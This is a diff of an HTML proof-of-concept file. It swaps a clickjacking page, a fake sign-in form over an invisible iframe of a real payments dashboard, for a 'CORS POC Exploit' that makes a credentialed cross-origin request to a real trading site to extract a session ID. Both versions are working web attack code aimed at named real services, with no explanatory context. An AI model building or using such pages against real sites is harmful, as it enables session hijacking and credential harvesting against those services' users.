@@ -1,88 +1,26 @@
-<!DOCTYPE html>
 <html>
-<head>
-<style>
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: rgba(240, 240, 240, 0.5);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    position: relative;
-}
-.signin-container {
-    width: 300px;
-    padding: 77px;
-    background-color: #fff;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    position: absolute;
-    z-index: 1;
-    right: 12%;
-}
-.signin-container h2 {
-    text-align: center;
-    margin-bottom: 20px;
-}
-.signin-container input[type="text"],
-.signin-container input[type="password"] {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 15px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-}
-.signin-container input[type="submit"] {
-    width: 100%;
-    padding: 10px;
-    background-color: #007bff;
-    color: #fff;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    font-size: 16px;
-}
-.signin-container input[type="submit"]:hover {
-    background-color: #0056b3;
-}
-.signin-container .signup-link {
-    text-align: center;
-    margin-top: 10px;
-}
-.signin-container .signup-link a {
-    color: #007bff;
-    text-decoration: none;
-}
-iframe {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 0;
-}
-</style>
-</head>
 <body>
-
-<iframe src="https://dashboard.rapyd.net/" width=1900px height=1080px style=”opacity: 0.0;”>
-</iframe>
-
-<div class="signin-container">
-    <h2>Sign In</h2>
-    <form>
-        <input type="text" placeholder="Username or Email">
-        <input type="password" placeholder="Password">
-        <input type="submit" value="Sign In">
-    </form>
-    <div class="signup-link">
-        <p>Don't have an account? <a href="#">Sign Up</a></p>
-    </div>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
 </div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://tradingview.capital.com/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
 </body>
 </html>
-
